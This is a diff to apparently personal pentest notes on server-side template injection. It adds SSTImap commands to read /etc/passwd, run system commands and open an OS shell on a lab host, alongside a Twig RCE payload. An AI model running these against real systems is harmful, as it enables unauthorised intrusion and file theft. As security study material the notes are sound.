@@ -89,7 +89,7 @@ Templating Engines are used to dynamically generate content.
 - Follow the below tree looking to find when payload is executed successfully i.e. 7*7 returns 49.
 - {{7*'7'}} will be 7777777 in Jinja, while in Twig, the result will be 49.
 
-![Identifying Template Engine](..\images\identify-template.png)
+![Identifying Template Engine](../images/identify-template.png)
 
 ### Jinga(python)
 
@@ -109,6 +109,22 @@ Templating Engines are used to dynamically generate content.
 | `{{ ['id'] \| filter('system') }}` | RCE using twigs `filter()` function to pass arguments to `system` the built-in PHP function |
 
 [Payload all the things cheat sheet for other templates](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)
+
+### SSTImap
+
+- For identifying and exploiting SSTI attacks
+- https://github.com/vladko312/SSTImap
+
+```bash
+git clone https://github.com/vladko312/SSTImap
+cd SSTImap
+pip3 install -r requirements.txt
+python3 sstimap.py
+python3 sstimap.py -u http://172.17.0.2/index.php?name=test # Provide target URL to identify SSTI
+python3 sstimap.py -u http://172.17.0.2/index.php?name=test -D '/etc/passwd' './passwd' # Download remote file to local machine
+python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id # Execute system commands
+python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell # Obtain interactive shell
+```
 
 
 ## SSI Injection - Directives
